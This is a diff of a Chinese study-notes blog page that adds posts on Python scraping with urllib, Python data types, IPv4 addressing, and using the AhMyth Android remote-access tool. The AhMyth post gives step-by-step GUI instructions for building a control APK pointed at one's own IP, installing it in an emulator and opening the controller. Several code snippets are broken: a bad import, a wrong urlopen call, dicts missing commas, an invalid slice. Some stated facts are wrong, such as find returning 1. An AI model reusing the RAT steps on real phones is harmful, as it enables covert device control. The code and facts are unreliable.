@@ -71,9 +71,177 @@
 
         <section id="main">
   
-    <article id="post-尚硅谷-爬虫" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-尚硅谷-爬虫-python爬虫" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/12/01/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB/" class="article-date">
+    <a href="/2023/12/04/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E7%88%AC%E8%99%AB/" class="article-date">
+  <time class="post-time" datetime="2023-12-04T05:31:20.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">04</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/04/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E7%88%AC%E8%99%AB/">尚硅谷—爬虫-python爬虫</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="python爬虫"><a href="#python爬虫" class="headerlink" title="python爬虫"></a>python爬虫</h2><h3 id="页面结构"><a href="#页面结构" class="headerlink" title="页面结构"></a>页面结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">    table 表格</span><br><span class="line">    tr    行</span><br><span class="line">    td    列</span><br><span class="line">    ul   li    无序列表</span><br><span class="line">    ol   li    有序列表</span><br><span class="line">    &lt;a href=&quot;链接&quot;&gt;&lt;/a&gt;     超文本</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="爬虫基本使用"><a href="#爬虫基本使用" class="headerlink" title="爬虫基本使用"></a>爬虫基本使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from urllib.request</span><br><span class="line">url = &quot;http://www.baidu.com&quot;</span><br><span class="line">resp = urlopen.request.urlopen(url)</span><br><span class="line">content = resp.read().decode(&quot;utf-8&quot;)</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231204173459242.png" alt="image-20231204173459242"></p>
+<h3 id="一个类型和6个方法"><a href="#一个类型和6个方法" class="headerlink" title="一个类型和6个方法"></a>一个类型和6个方法</h3><blockquote>
+<ul>
+<li>一个类型HTTPResponse</li>
+<li>六个方法read  readline  readlines  getcode  geturl  getheaders</li>
+</ul>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一个类型指的是response是HTTPResponse类型</span><br><span class="line">print(type(response))</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231204185730132.png" alt="image-20231204185730132"></p>
+<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.request.urlretrieve(url,&quot;文件要加后最名&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="请求对象的定制"><a href="#请求对象的定制" class="headerlink" title="请求对象的定制"></a>请求对象的定制</h3><p>uA介绍:user Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU类型、浏览器及版本。浏览器内核、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法: request = urllib.request.Request()</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231204192039265.png" alt="image-20231204192039265"></p>
+<h3 id="初级代码"><a href="#初级代码" class="headerlink" title="初级代码"></a>初级代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">#https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=%E5%91%A8%E6%9D%B0%E4%BC%A6</span><br><span class="line"></span><br><span class="line"># 定义一个函数，用于获取百度搜索结果</span><br><span class="line">url = &quot;https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=%E5%91%A8%E6%9D%B0%E4%BC%A6&quot;</span><br><span class="line"></span><br><span class="line">request = urllib.request.Request(url)   </span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line">html = response.read().decode(&quot;utf-8&quot;)</span><br><span class="line">print(html)</span><br></pre></td></tr></table></figure>
+
+<h3 id="get请求urlencode方法"><a href="#get请求urlencode方法" class="headerlink" title="get请求urlencode方法"></a>get请求urlencode方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">date = &#123;</span><br><span class="line">	&#x27;wd&#x27;:&#x27;周杰伦&#x27;</span><br><span class="line">	&#x27;sex&#x27;:&#x27;男&#x27;</span><br><span class="line">	&#x27;location&#x27;:&#x27;中国台湾省&#x27;</span><br><span class="line">&#125;</span><br><span class="line">a = urllib.parse.urlencode(date)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231204202050234.png" alt="image-20231204202050234"></p>
+<h3 id="post请求翻译"><a href="#post请求翻译" class="headerlink" title="post请求翻译"></a>post请求翻译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#爬取翻译网页https://fanyi.baidu.com/sug，并翻译spider</span><br><span class="line">import urllib.parse</span><br><span class="line">import urllib.request</span><br><span class="line">import json</span><br><span class="line">url = &#x27;https://fanyi.baidu.com/sug&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;kw&#x27;:&#x27;spider&#x27;</span><br><span class="line">&#125;</span><br><span class="line">data = urllib.parse.urlencode(data).encode(&#x27;utf-8&#x27;)</span><br><span class="line">request = urllib.request.Request(url=url, data=data)</span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line">content = response.read().decode(&#x27;utf-8&#x27;)</span><br><span class="line">data = json.loads(content)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231204211536280.png" alt="image-20231204211536280"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/04/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E7%88%AC%E8%99%AB/" data-id="clprnfur10002oku40f693f9q" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-cs模式" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/04/cs%E6%A8%A1%E5%BC%8F/" class="article-date">
+  <time class="post-time" datetime="2023-12-04T02:59:49.000Z" itemprop="datePublished">
+    <span class="post-month">12月</span><br/>
+    <span class="post-day">04</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/12/04/cs%E6%A8%A1%E5%BC%8F/">cs模式和安卓远控</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="cs模式"><a href="#cs模式" class="headerlink" title="cs模式"></a>cs模式</h2><p>c是客户端，s是服务端</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204110320949.png" alt="image-20231204110320949"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204112238364.png" alt="image-20231204112238364"></p>
+<h2 id="安卓远控"><a href="#安卓远控" class="headerlink" title="安卓远控"></a>安卓远控</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204142906843.png" alt="image-20231204142906843"></p>
+<p>建议使用模拟器：mumu模拟器6</p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>打开安装AhMyth</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143047359.png" alt="image-20231204143047359"></p>
+<ul>
+<li>点击APK Builder，在Source IP中输入本机ip地址，再点击Build</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143239667.png" alt="image-20231204143239667"></p>
+<p>下方会生成一个地址存放下载的控制exe</p>
+<p>将其安装到模拟器中</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143528214.png" alt="image-20231204143528214"></p>
+<p>双击打开，再点击Listen就会多一个控制台</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204143912166.png" alt="image-20231204143912166"> </p>
+<p>点击左边的Open The Lab黑色部分。就可以进入控制器了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204144057441.png" alt="image-20231204144057441"></p>
+<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="ipv4"><a href="#ipv4" class="headerlink" title="ipv4"></a>ipv4</h3><p>第一类: 10.0.0.0-10.255.255.255;</p>
+<p>第二类: 172.16.0.0-172.31.255.255;</p>
+<p>第三类: 192.168.0.0-192.168.255.255;</p>
+<p>第四类: 100.64.0.0-100.127.255.255;</p>
+<p>这类通常用于运营商内部</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204163506472.png" alt="image-20231204163506472"></p>
+<p>​	    <strong>1）网络地址</strong></p>
+<p>　　IP地址由网络号（包括子网号）和主机号组成，网络地址的主机号为全0，网络地址代表着整个网络。</p>
+<p>　　<strong>2）广播地址</strong></p>
+<p>　　广播地址通常称为直接广播地址，是为了区分受限广播地址。</p>
+<p>　　广播地址与网络地址的主机号正好相反，广播地址中，主机号为全1。当向某个网络的广播地址发送	    消息时，该网络内的所有主机都能收到该广播消息。</p>
+<p>　　<strong>3）组播地址</strong></p>
+<p>　　D类地址就是组播地址。</p>
+<p>　　先回忆下A，B，C，D类地址吧：</p>
+<p>　　A类地址以0开头，第一个字节作为网络号，地址范围为：0.0.0.0~127.255.255.255</p>
+<p>　　B类地址以10开头，前两个字节作为网络号，地址范围是：128.0.0.0~191.255.255.255;</p>
+<p>　　C类地址以110开头，前三个字节作为网络号，地址范围是：192.0.0.0~223.255.255.255。</p>
+<p>　　D类地址以1110开头，地址范围是224.0.0.0~239.255.255.255，D类地址作为组播地址（一对多的通		信）；</p>
+<p>　　E类地址以1111开头，地址范围是240.0.0.0~255.255.255.255，E类地址为保留地址，供以后使用。</p>
+<p>　　注：只有A,B,C有网络号和主机号之分，D类地址和E类地址没有划分网络号和主机号。</p>
+<p>　　<strong>4）255.255.255.255</strong></p>
+<p>　　该IP地址指的是受限的广播地址。受限广播地址与一般广播地址（直接广播地址）的区别在于，受限		广播地址只能用于本地网络，路由器不会转发以受限广播地址为目的地址的分组；一般广播地址既可		在本地广播，也可跨网段广播。例如：主机192.168.1.1&#x2F;30上的直接广播数据包后，另外一个网段		192.168.1.5&#x2F;30也能收到该数据报；若发送受限广播数据报，则不能收到。</p>
+<p>　　注：一般的广播地址（直接广播地址）能够通过某些路由器（当然不是所有的路由器），而受限的广		播地址不能通过路由器。</p>
+<p>　　<strong>5）0.0.0.0</strong></p>
+<p>　　常用于寻找自己的IP地址，例如在我们的RARP，BOOTP和DHCP协议中，若某个未知IP地址的无盘机		想要知道自己的IP地址，它就以255.255.255.255为目的地址，向本地范围（具体而言是被各个路由		器屏蔽的范围内）的服务器发送IP请求分组。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231204172637866.png" alt="image-20231204172637866"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/12/04/cs%E6%A8%A1%E5%BC%8F/" data-id="clprnfuqx0000oku4hi57f2ix" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+  
+    <article id="post-尚硅谷-爬虫-python基础" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/12/01/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E5%9F%BA%E7%A1%80/" class="article-date">
   <time class="post-time" datetime="2023-12-01T08:59:46.000Z" itemprop="datePublished">
     <span class="post-month">12月</span><br/>
     <span class="post-day">01</span>
@@ -88,7 +256,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2023/12/01/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB/">python基础</a>
+      <a class="article-title" href="/2023/12/01/%E5%B0%9A%E7%A1%85%E8%B0%B7-%E7%88%AC%E8%99%AB-python%E5%9F%BA%E7%A1%80/">python基础</a>
     </h1>
   
 
@@ -340,11 +508,237 @@
 
 <p>#判断元素的个数</p>
 <p>len()</p>
-<h3 id="数据类型高级"><a href="#数据类型高级" class="headerlink" title="数据类型高级"></a>数据类型高级</h3><h4 id="字符串高级"><a href="#字符串高级" class="headerlink" title="字符串高级"></a>字符串高级</h4>
+<h3 id="数据类型高级"><a href="#数据类型高级" class="headerlink" title="数据类型高级"></a>数据类型高级</h3><h4 id="字符串高级"><a href="#字符串高级" class="headerlink" title="字符串高级"></a>字符串高级</h4><table>
+<thead>
+<tr>
+<th>操作</th>
+<th>描述</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>len</td>
+<td>获取长度:len</td>
+<td>len函数可以获取字符串的长度。</td>
+</tr>
+<tr>
+<td>find</td>
+<td>查找内容:find</td>
+<td>查找指定内容在字符串中是否存在，如果存在就返回该内容在字符串中第一次出现的开始位置索引值，如果不存在，则返回1.</td>
+</tr>
+<tr>
+<td>startwith,endswith</td>
+<td>判断:startswith,endswith</td>
+<td>判断字符串是是以谁谁谁开头&#x2F;结尾</td>
+</tr>
+<tr>
+<td>count</td>
+<td>计算出现次数:count</td>
+<td>返回str在start和end之间在mystr里面出现的次数</td>
+</tr>
+<tr>
+<td>replace</td>
+<td>替换内容:replace</td>
+<td>替换字符串中指定的内容，如果指定次数count，则替换不会超过count次</td>
+</tr>
+<tr>
+<td>split</td>
+<td>切割字符串:split</td>
+<td>通过参数的必容切割字符串</td>
+</tr>
+<tr>
+<td>upper,lower</td>
+<td>修改大小写:upper,lower</td>
+<td>将字符串中的大小写互换</td>
+</tr>
+<tr>
+<td>strip</td>
+<td>空格处理:strip</td>
+<td>去容格</td>
+</tr>
+<tr>
+<td>join</td>
+<td>符串拼接:join</td>
+<td>字符串拼接</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;  china   &quot;</span><br><span class="line"></span><br><span class="line">#获取长度：len()</span><br><span class="line">print(len(s))</span><br><span class="line"></span><br><span class="line">#查看内容：find</span><br><span class="line">print(s.find(&quot;c&quot;))</span><br><span class="line"></span><br><span class="line">#判断开头结尾：startswith,endswith</span><br><span class="line">print(s.startswith(&quot;c&quot;))</span><br><span class="line">print(s.endswith(&quot;c&quot;))</span><br><span class="line"></span><br><span class="line">#计算出现的出现的次数：count</span><br><span class="line">print(s.count(&quot;c&quot;))</span><br><span class="line"></span><br><span class="line">#替换内容：replace</span><br><span class="line">print(s.replace(&quot;c&quot;,&quot;b&quot;))</span><br><span class="line"></span><br><span class="line">#切割内容：split</span><br><span class="line">print(s.split(&quot;i&quot;))</span><br><span class="line"></span><br><span class="line">#修改内容大小写：upper,lower</span><br><span class="line">print(s.upper())</span><br><span class="line"></span><br><span class="line">#空格处理：strip</span><br><span class="line">print(s.strip())</span><br><span class="line"></span><br><span class="line">#字符拼接：join</span><br><span class="line">a = &quot;a&quot;</span><br><span class="line">print(a.join(s))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203144513070.png" alt="image-20231203144513070"></p>
+<h4 id="列表高级"><a href="#列表高级" class="headerlink" title="列表高级"></a>列表高级</h4><h5 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h5><ul>
+<li>append 在末尾添加元素</li>
+<li>insert 在指定位置插入元素</li>
+<li>extend 合并两个列表</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">char = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]</span><br><span class="line"></span><br><span class="line">#append 在末尾添加元素</span><br><span class="line">char.append(&#x27;d&#x27;)</span><br><span class="line">print(char)</span><br><span class="line"></span><br><span class="line">#insert 在指定位置插入元素</span><br><span class="line">char.insert(3,(&#x27;e&#x27;))</span><br><span class="line">print(char)</span><br><span class="line"></span><br><span class="line">#extend 合并两个列表</span><br><span class="line">char_1 = [&#x27;f&#x27;,&#x27;g&#x27;]</span><br><span class="line">char.extend(char_1)</span><br><span class="line">print(char)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203150309578.png" alt="image-20231203150309578"></p>
+<h5 id="修改元素"><a href="#修改元素" class="headerlink" title="修改元素"></a>修改元素</h5><p>我们是通过指定下标来访问列表元素，因此修改元素的时候，为指定的列表下标赋值即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;e&#x27;]</span><br><span class="line">#将列表的元素的值修改</span><br><span class="line">char[3] = &#x27;d&#x27;</span><br><span class="line">print(char)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203152844697.png" alt="image-20231203152844697"></p>
+<h5 id="查找元素"><a href="#查找元素" class="headerlink" title="查找元素"></a>查找元素</h5><ul>
+<li>in (存在） ,如果存在那么结果为true，否则为false</li>
+<li>not in(不存在)，如果不存在那么结果为true，否则false</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">char = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;e&#x27;]</span><br><span class="line">#将列表的元素的值修改</span><br><span class="line">s = input(&quot;请输入字母：&quot;)</span><br><span class="line">if s in char:</span><br><span class="line">    print(&quot;在&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;不在&quot;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203165524891.png" alt="image-20231203165524891"></p>
+<h5 id="删除元素"><a href="#删除元素" class="headerlink" title="删除元素"></a>删除元素</h5><ul>
+<li>del:根据下标进行删除</li>
+<li>pop:删除最后一个元素</li>
+<li>remove:根据元素的值进行删除</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = [1,2,2,3,4,5]</span><br><span class="line">#del:根据下标进行删除</span><br><span class="line">del s[1]</span><br><span class="line">print(s)</span><br><span class="line">#pop:删除最后一个元素</span><br><span class="line">s.pop()</span><br><span class="line">print(s)</span><br><span class="line">#remove:根据元素的值进行删除</span><br><span class="line">s.remove(2)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203172442657.png" alt="image-20231203172442657"></p>
+<h4 id="元组高级"><a href="#元组高级" class="headerlink" title="元组高级"></a>元组高级</h4><p>元组是不可以修改里面的内容的，</p>
+<p>[注]：定义只有一个元素的元组，需要在唯一的元素后写一个逗号。</p>
+<h4 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h4><ul>
+<li>切片是指对操作的对象截取其中一部分的操作。字符串、列表、元组都支持切片操作。</li>
+<li><strong>切片的语法∶[起始:结束:步长]，也可以简化使用[起始:结束]</strong></li>
+<li>注意:选取的区间从”起始”位开始，到”结束”位的前一位结束(不包含结束位本身)，步长表示选取间隔。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = &#x27;123456789&#x27;</span><br><span class="line">print(s[0,8,3])</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203194805539.png" alt="image-20231203194805539"></p>
+<h4 id="字典高级"><a href="#字典高级" class="headerlink" title="字典高级"></a>字典高级</h4><h5 id="查看元素"><a href="#查看元素" class="headerlink" title="查看元素"></a>查看元素</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">print(a[&#x27;name&#x27;])</span><br><span class="line">print(a[&#x27;age&#x27;])</span><br><span class="line">print(a.get(&#x27;name&#x27;))</span><br><span class="line">print(a.get(&#x27;age&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>区别：使用[]的方式，获取字典中不存在的key的时候会发生异常keyerror</p>
+<p>​			使用.的方式，获取字典中不存在的key的时候会返回None值</p>
+<h5 id="修改元素-1"><a href="#修改元素-1" class="headerlink" title="修改元素"></a>修改元素</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">a[&#x27;name&#x27;] = &#x27;李四&#x27;</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203202101121.png" alt="image-20231203202101121"></p>
+<h5 id="添加元素-1"><a href="#添加元素-1" class="headerlink" title="添加元素"></a>添加元素</h5><p>如果使用变量名字[‘键’]&#x3D;数据时﹑这个键如果在字典中不存在﹑那么就会变成新增元素（如果这个健在字典中存在那么就会变成这个元素，修改）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">a[&#x27;sex&#x27;] = &#x27;男&#x27;</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:%5CUsers%5CAdministrator%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231203202908864.png" alt="image-20231203202908864"></p>
+<h5 id="删除元素-1"><a href="#删除元素-1" class="headerlink" title="删除元素"></a>删除元素</h5><h6 id="del"><a href="#del" class="headerlink" title="del"></a>del</h6><ul>
+<li>删除一个元素</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">del a[&#x27;age&#x27;]</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203203546237.png" alt="image-20231203203546237"></p>
+<ul>
+<li>删除字典</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">del a</span><br></pre></td></tr></table></figure>
+
+<h6 id="clear"><a href="#clear" class="headerlink" title="clear"></a>clear</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">a.clear()</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203203927782.png" alt="image-20231203203927782"></p>
+<h5 id="遍历元素"><a href="#遍历元素" class="headerlink" title="遍历元素"></a>遍历元素</h5><ul>
+<li>遍历key</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">for key in a.keys():</span><br><span class="line">    print(key)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203204654356.png" alt="image-20231203204654356"></p>
+<ul>
+<li>遍历value</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = &#123;&#x27;name&#x27;:&#x27;张三&#x27;,&#x27;age&#x27;:&#x27;30&#x27;&#125;</span><br><span class="line">for value in a.values():</span><br><span class="line">    print(value)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhenghuangfei/tu@main//imgimage-20231203204802813.png" alt="image-20231203204802813"></p>
+<ul>
+<li>遍历key和value</li>
+</ul>
